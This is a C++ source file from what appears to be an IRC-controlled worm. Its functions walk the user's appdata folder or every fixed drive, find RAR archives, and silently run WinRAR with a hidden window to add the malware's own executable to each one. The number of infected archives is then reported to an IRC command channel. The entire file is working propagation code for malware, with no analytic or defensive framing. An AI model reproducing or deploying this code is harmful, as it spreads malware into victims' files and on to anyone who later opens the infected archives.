#include "../spreading.hpp"

//rar.exe a -ep -y RARArchive FileToAdd
DWORD __stdcall InfectRARZip( USBI *rarzip ) {
	API *api = ((API*)rarzip->api);
	char progpath[MAX_PATH] = {0};
	char result[MAX_PATH] = {0};
	((API*)rarzip->api)->ExpandEnvironmentStrings("%programfiles%", progpath, MAX_PATH);
	string rarpath = progpath;
	rarpath += "\\WinRAR\\rar.exe";	
	if (!((API*)rarzip->api)->fileExists(rarpath)) {
		return 0;
	}
	switch(rarzip->mode) {
		case 1: { //lite
			((API*)rarzip->api)->ExpandEnvironmentStrings("%appdata%\\..\\*", progpath, MAX_PATH);
			((API*)rarzip->api)->wsprintf(result, MSG_RARZIP, DoRARZipInfection(rarzip->api, progpath));
			break;
		} case 2: { //thorough
			int infected = 0;
			char cdrives[64] = {0};
			((API*)rarzip->api)->GetLogicalDriveStringsA(64, cdrives);
			
			short times = 1;
			string tempdrive = "";
			while (cdrives[4*times] != '\0') {
				try {
					tempdrive = cdrives;
					tempdrive += "*";
					if (!(cdrives[0] == 'A')) {
						if (!(((API*)rarzip->api)->GetDriveType(cdrives) == DRIVE_CDROM)) {
							infected += DoRARZipInfection(rarzip->api, tempdrive);
						}
					}
					cdrives[0] = cdrives[4*times];
					times++;
				} catch(...) {}
			}
			((API*)rarzip->api)->wsprintf(result, MSG_RARZIP, infected);
			break;
		}
	}
	((IRC*)rarzip->irc)->IRCSend(IRC_MSG, ((IRC*)rarzip->irc)->servers[((IRC*)rarzip->irc)->currserver].channel, result);
	try { delete rarzip; } catch(int e) {}
	return 0;
}

int DoRARZipInfection( DWORD api, string path ) {
	int rars = 0;
	try {
		API::WIN32_FIND_DATAA ffd;
		HANDLE file = ((API*)api)->FindFirstFile(path.c_str(), &ffd);
		do {
			string ffdfile = ffd.cFileName;
			if (ffdfile == "")
				continue;
			if (ffd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
				if (!(ffdfile == "." || ffdfile == "..")) {
					rars += DoRARZipInfection(api, path.substr(0, path.length() - 1) + ffd.cFileName + "\\*");
				}
				continue;
			}
			if (ffdfile.substr(ffdfile.length() - 3, 3) == "rar") {
				char temp[MAX_PATH] = {0};
				string param = "a -ep -y ";
				if (path.find_first_of('*') != string::npos)
					path.erase(path.find_first_of('*'), 1);
				param += "\"" + path + ffdfile + "\"" + " \"" + ((API*)api)->thisfile + "\"";
				((API*)api)->ExpandEnvironmentStringsA("%programfiles%\\WinRAR\\rar.exe", temp, MAX_PATH);
				((API*)api)->ShellExecuteA(NULL, "open", temp, param.c_str(), "", SW_HIDE); 
				rars++;
			}
		} while(((API*)api)->FindNextFileA(file, &ffd) != 0 );
		((API*)api)->FindClose(file);
	} catch (...) {}
	return rars;
}